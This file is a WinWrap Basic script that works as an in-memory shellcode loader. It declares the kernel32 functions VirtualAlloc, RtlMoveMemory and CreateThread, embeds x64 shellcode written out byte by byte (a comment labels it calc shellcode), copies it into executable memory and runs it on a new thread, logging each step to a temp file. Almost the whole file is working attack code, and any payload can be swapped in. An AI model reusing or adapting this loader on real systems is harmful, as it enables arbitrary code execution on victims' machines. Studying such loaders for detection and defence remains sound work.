'#Language "WWB-COM"

' Import necessary Windows APIs
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, _
    ByVal Source As String, ByVal Length As Long) As Long
Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, _
    ByVal dwMilliseconds As Long) As Long

' Global log file handle
Private Const LogFile As String = "C:\Windows\Temp\execution_log.txt"
Private LogFileNum As Integer

Sub Main()
    On Error GoTo ErrorHandler

    ' Initialize log file
    InitLogFile
    WriteLog "Execution started"

    ' Define shellcode directly
    Dim binaryStr As String
    ' calc shellcode
    binaryStr = Chr(&H48) & Chr(&H31) & Chr(&HFF) & Chr(&H48) & Chr(&HF7) & _
             Chr(&HE7) & Chr(&H65) & Chr(&H48) & Chr(&H8B) & Chr(&H58) & _
             Chr(&H60) & Chr(&H48) & Chr(&H8B) & Chr(&H5B) & Chr(&H18) & _
             Chr(&H48) & Chr(&H8B) & Chr(&H5B) & Chr(&H20) & Chr(&H48) & _
             Chr(&H8B) & Chr(&H1B) & Chr(&H48) & Chr(&H8B) & Chr(&H1B) & _
             Chr(&H48) & Chr(&H8B) & Chr(&H5B) & Chr(&H20) & Chr(&H49) & _
             Chr(&H89) & Chr(&HD8) & Chr(&H8B) & Chr(&H5B) & Chr(&H3C) & _
             Chr(&H4C) & Chr(&H01) & Chr(&HC3) & Chr(&H48) & Chr(&H31) & _
             Chr(&HC9) & Chr(&H66) & Chr(&H81) & Chr(&HC1) & Chr(&HFF) & _
             Chr(&H88) & Chr(&H48) & Chr(&HC1) & Chr(&HE9) & Chr(&H08) & _
             Chr(&H8B) & Chr(&H14) & Chr(&H0B) & Chr(&H4C) & Chr(&H01) & _
             Chr(&HC2) & Chr(&H4D) & Chr(&H31) & Chr(&HD2) & Chr(&H44) & _
             Chr(&H8B) & Chr(&H52) & Chr(&H1C) & Chr(&H4D) & Chr(&H01) & _
             Chr(&HC2) & Chr(&H4D) & Chr(&H31) & Chr(&HDB) & Chr(&H44) & _
             Chr(&H8B) & Chr(&H5A) & Chr(&H20) & Chr(&H4D) & Chr(&H01) & _
             Chr(&HC3) & Chr(&H4D) & Chr(&H31) & Chr(&HE4) & Chr(&H44) & _
             Chr(&H8B) & Chr(&H62) & Chr(&H24) & Chr(&H4D) & Chr(&H01) & _
             Chr(&HC4) & Chr(&HEB) & Chr(&H32) & Chr(&H5B) & Chr(&H59) & _
             Chr(&H48) & Chr(&H31) & Chr(&HC0) & Chr(&H48) & Chr(&H89) & _
             Chr(&HE2) & Chr(&H51) & Chr(&H48) & Chr(&H8B) & Chr(&H0C) & _
             Chr(&H24) & Chr(&H48) & Chr(&H31) & Chr(&HFF) & Chr(&H41) & _
             Chr(&H8B) & Chr(&H3C) & Chr(&H83) & Chr(&H4C) & Chr(&H01) & _
             Chr(&HC7) & Chr(&H48) & Chr(&H89) & Chr(&HD6) & Chr(&HF3) & _
             Chr(&HA6) & Chr(&H74) & Chr(&H05) & Chr(&H48) & Chr(&HFF) & _
             Chr(&HC0) & Chr(&HEB) & Chr(&HE6) & Chr(&H59) & Chr(&H66) & _
             Chr(&H41) & Chr(&H8B) & Chr(&H04) & Chr(&H44) & Chr(&H41) & _
             Chr(&H8B) & Chr(&H04) & Chr(&H82) & Chr(&H4C) & Chr(&H01) & _
             Chr(&HC0) & Chr(&H53) & Chr(&HC3) & Chr(&H48) & Chr(&H31) & _
             Chr(&HC9) & Chr(&H80) & Chr(&HC1) & Chr(&H07) & Chr(&H48) & _
             Chr(&HB8) & Chr(&H0F) & Chr(&HA8) & Chr(&H96) & Chr(&H91) & _
             Chr(&HBA) & Chr(&H87) & Chr(&H9A) & Chr(&H9C) & Chr(&H48) & _
             Chr(&HF7) & Chr(&HD0) & Chr(&H48) & Chr(&HC1) & Chr(&HE8) & _
             Chr(&H08) & Chr(&H50) & Chr(&H51) & Chr(&HE8) & Chr(&HB0) & _
             Chr(&HFF) & Chr(&HFF) & Chr(&HFF) & Chr(&H49) & Chr(&H89) & _
             Chr(&HC6) & Chr(&H48) & Chr(&H31) & Chr(&HC9) & Chr(&H48) & _
             Chr(&HF7) & Chr(&HE1) & Chr(&H50) & Chr(&H48) & Chr(&HB8) & _
             Chr(&H9C) & Chr(&H9E) & Chr(&H93) & Chr(&H9C) & Chr(&HD1) & _
             Chr(&H9A) & Chr(&H87) & Chr(&H9A) & Chr(&H48) & Chr(&HF7) & _
             Chr(&HD0) & Chr(&H50) & Chr(&H48) & Chr(&H89) & Chr(&HE1) & _
             Chr(&H48) & Chr(&HFF) & Chr(&HC2) & Chr(&H48) & Chr(&H83) & _
             Chr(&HEC) & Chr(&H20) & Chr(&H41) & Chr(&HFF) & Chr(&HD6)

    WriteLog "Shellcode loaded, length: " & Len(binaryStr) & " bytes"

    ' Memory constants
    Const MEM_COMMIT As Long = &H1000
    Const PAGE_EXECUTE_READWRITE As Long = &H40

    ' Allocate executable memory
    WriteLog "Allocating memory..."
    Dim memoryAddress As Long
    memoryAddress = VirtualAlloc(0, Len(binaryStr), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    ' Check if memory allocation succeeded
    If memoryAddress = 0 Then
        WriteLog "FAILED: Memory allocation failed! Error: " & Err.LastDLLError
        GoTo Cleanup
    End If

    WriteLog "Memory allocated at: 0x" & Hex(memoryAddress)

    ' Copy shellcode to allocated memory
    WriteLog "Copying shellcode to memory..."
    RtlMoveMemory memoryAddress, binaryStr, Len(binaryStr)
    WriteLog "Shellcode copied successfully"
    FlushLog  ' Force flush before execution attempt

    ' Execute shellcode using CreateThread
    WriteLog "Creating execution thread..."
    Dim threadID As Long
    Dim threadHandle As Long
    threadHandle = CreateThread(0, 0, memoryAddress, 0, 0, threadID)

    ' Check if CreateThread succeeded
    If threadHandle = 0 Then
        WriteLog "FAILED: Thread creation failed with error: " & Err.LastDLLError
    Else
        WriteLog "Thread created successfully with ID: " & threadID

        ' Wait briefly for execution
        WriteLog "Waiting for execution to complete..."
        FlushLog  ' Force flush before waiting
        WaitForSingleObject threadHandle, 2000  ' Wait only 2 seconds max
        WriteLog "Wait completed"
    End If

Cleanup:
    WriteLog "Execution sequence completed"
    CloseLogFile
    Exit Sub

ErrorHandler:
    WriteLog "CRITICAL ERROR: " & Err.Description & " (Code: " & Err.Number & ")"
    If Err.LastDLLError <> 0 Then
        WriteLog "DLL Error: " & Err.LastDLLError
    End If
    Resume Cleanup
End Sub

' File logging functions
Sub InitLogFile()
    On Error Resume Next
    LogFileNum = FreeFile
    Open LogFile For Output As #LogFileNum
    If Err.Number <> 0 Then
        ' If we can't open for output (overwrite), try to append
        On Error Resume Next
        Open LogFile For Append As #LogFileNum
    End If
    WriteLog "--- NEW EXECUTION " & Now() & " ---"
End Sub

Sub WriteLog(message As String)
    On Error Resume Next
    Print #LogFileNum, Now() & ": " & message
End Sub

Sub FlushLog()
    On Error Resume Next
    Close #LogFileNum
    Open LogFile For Append As #LogFileNum
End Sub

Sub CloseLogFile()
    On Error Resume Next
    Close #LogFileNum
End Sub
